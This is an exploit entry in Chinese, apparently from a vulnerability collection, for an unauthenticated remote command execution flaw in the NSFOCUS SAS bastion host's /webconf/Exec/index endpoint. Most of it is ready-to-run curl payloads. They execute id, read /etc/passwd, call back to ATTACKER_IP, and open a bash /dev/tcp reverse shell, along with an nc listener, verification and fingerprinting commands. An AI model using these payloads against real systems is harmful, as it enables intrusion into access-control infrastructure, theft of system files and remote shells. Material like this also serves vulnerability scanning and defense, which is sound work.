---
id: NSFOCUS-SAS-RCE
title: 绿盟 SAS 堡垒机 Exec 远程命令执行漏洞
product: nsfocus
vendor: NSFOCUS (绿盟)
version_affected: "绿盟 SAS 堡垒机（受影响版本）"
severity: CRITICAL
tags: [rce, command_injection, 无需认证, 国产]
fingerprint: ["NSFOCUS", "绿盟", "needUsbkey.php"]
---

## 漏洞描述

绿盟 SAS 堡垒机的 `ExecController` 的 `index` Action 直接将用户传入的 `cmd` 参数通过 PHP `exec()` 函数执行，未进行任何过滤和权限校验，导致未经认证的攻击者可远程执行任意系统命令。

## 影响版本

- 绿盟 SAS 堡垒机（受影响版本）

## 前置条件

- 无需认证
- 目标 HTTP 端口可访问
- `/webconf/Exec/index` 接口可达

## 利用步骤

1. 确认目标为绿盟 SAS 堡垒机
2. 向 `/webconf/Exec/index` 接口发送请求，通过 `cmd` 参数传入要执行的命令
3. 从响应中获取命令执行结果（响应包含 "WEBSVC OK" 标志）
4. 可进一步利用反弹 shell 获取交互式权限

## Payload

### 基本命令执行

```bash
curl "http://target/webconf/Exec/index?cmd=id"
```

### 读取敏感文件

```bash
curl "http://target/webconf/Exec/index?cmd=cat+/etc/passwd"
```

### HTTP 回调

```bash
curl "http://target/webconf/Exec/index?cmd=curl+http://ATTACKER_IP/callback"
```

### 反弹 shell

```bash
curl "http://target/webconf/Exec/index?cmd=bash+-i+>%26+/dev/tcp/ATTACKER_IP/PORT+0>%261"
```

## 验证方法

```bash
# 检查响应中是否包含 "WEBSVC OK" 或命令输出
curl -s "http://target/webconf/Exec/index?cmd=id" | grep -E "uid=|WEBSVC OK"

# 检查 /etc/passwd 读取
curl -s "http://target/webconf/Exec/index?cmd=cat+/etc/passwd" | grep "root:"

# HTTP 回调验证
# 攻击者: nc -lvp 80
curl -s "http://target/webconf/Exec/index?cmd=curl+http://ATTACKER_IP/callback"
```

## 指纹确认

```bash
curl -s "http://target/" | grep -i "NSFOCUS\|绿盟\|needUsbkey\|SAS"
curl -s -o /dev/null -w "%{http_code}" "http://target/webconf/Exec/index"
```
